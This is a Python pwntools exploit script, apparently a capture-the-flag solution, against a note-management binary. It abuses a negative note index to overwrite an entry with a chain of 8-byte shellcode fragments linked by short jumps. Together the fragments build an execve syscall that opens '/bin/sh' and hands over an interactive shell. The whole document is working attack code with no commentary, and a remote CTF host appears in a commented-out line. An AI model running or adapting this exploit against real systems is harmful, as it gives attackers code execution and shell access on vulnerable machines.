from pwn import *
context(arch='amd64', os='linux')

io = process('./pwn')
# io = remote('111.200.241.244', 57690)

def add_note(index, length, string):
	io.sendlineafter(b'your choice>>', b'1')
	io.sendlineafter(b'index:', str(index).encode())
	io.sendlineafter(b'size:', str(length).encode())
	io.sendafter(b'content:', string)
	io.recvuntil(b'5. exit\n')

def del_note(index):
	io.sendlineafter(b'choice>>', b'4')
	io.sendlineafter(b'index:', str(index).encode())
	io.recvuntil(b'5. exit\n')

io.recvuntil(b'5. exit\n')
chunk0 = (asm('xor rax, rax') + b'\x90\x90\xEB\x19')
chunk1 = (asm('mov eax, 0x3B') + b'\xEB\x19')
chunk2 = (asm('xor rsi, rsi') + b'\x90\x90\xEB\x19')
chunk3 = (asm('xor rdx, rdx') + b'\x90\x90\xEB\x19')
chunk4 = (asm('syscall').ljust(7, b'\x90'))
add_note(0, 8, b'A' * 7)
add_note(1, 8, chunk1)
add_note(2, 8, chunk2)
add_note(3, 8, chunk3)
add_note(4, 8, chunk4)

del_note(0)
add_note(-8, 8, chunk0)
io.sendlineafter(b'your choice>>', b'/bin/sh')
io.interactive()